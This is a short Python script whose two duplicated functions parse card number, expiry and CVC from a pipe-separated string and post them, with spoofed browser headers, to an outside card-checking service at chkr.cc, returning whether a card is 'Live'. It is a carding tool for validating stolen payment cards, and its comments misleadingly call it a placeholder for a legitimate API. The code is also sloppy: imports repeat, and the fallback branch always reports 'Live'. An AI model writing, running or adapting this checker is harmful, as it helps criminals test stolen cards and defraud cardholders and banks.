import requests
import re
import random
import time
import string
import base64
from bs4 import BeautifulSoup
import requests

def Tele(ccx):
    # Strip any extra spaces
    ccx = ccx.strip()

    try:
        # Split the card details into number, month, year, and CVC
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3]
    except IndexError:
        print(f"Error: The input string {ccx} is not in the correct format.")
        return

    # Shorten year if necessary (e.g., '2028' becomes '28')
    if "20" in yy:
        yy = yy.split("20")[1]

    # Create a session

    # Example headers (customize as needed)
    headers = {
        'authority': 'chkr.cc',
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'content-length': '44',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://chkr.cc',
        'priority': 'u=1, i',
        'referer': 'https://chkr.cc/',
        'sec-ch-ua': ' "Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132" ',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    # Example data payload (customize as needed)
    data = {
         'data':  f'{n}|{mm}|20{yy}|{cvc}',
         'key': '',
    }


    # Make an API request (using a legitimate API, not the one you're working with)
    # This is just a placeholder for a legitimate use case, e.g., Stripe API or any other
    response = requests.post('https://chkr.cc/api.php', headers=headers, data=data).json()
    try:
    	ii=response['msg']
    except:
    	return 'Live' or 'Thank You'
    return ii
import requests

def Tele1(ccx):
    # Strip any extra spaces
    ccx = ccx.strip()

    try:
        # Split the card details into number, month, year, and CVC
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3]
    except IndexError:
        print(f"Error: The input string {ccx} is not in the correct format.")
        return

    # Shorten year if necessary (e.g., '2028' becomes '28')
    if "20" in yy:
        yy = yy.split("20")[1]

    # Create a session

    # Example headers (customize as needed)
    headers = {
        'authority': 'chkr.cc',
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'content-length': '44',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://chkr.cc',
        'priority': 'u=1, i',
        'referer': 'https://chkr.cc/',
        'sec-ch-ua': ' "Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132" ',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    # Example data payload (customize as needed)
    data = {
         'data':  f'{n}|{mm}|20{yy}|{cvc}',
         'key': '',
    }


    # Make an API request (using a legitimate API, not the one you're working with)
    # This is just a placeholder for a legitimate use case, e.g., Stripe API or any other
    response = requests.post('https://chkr.cc/api.php', headers=headers, data=data).json()
    try:
    	ii=response['msg']
    except:
    	return 'Live' or 'Thank You'
    return ii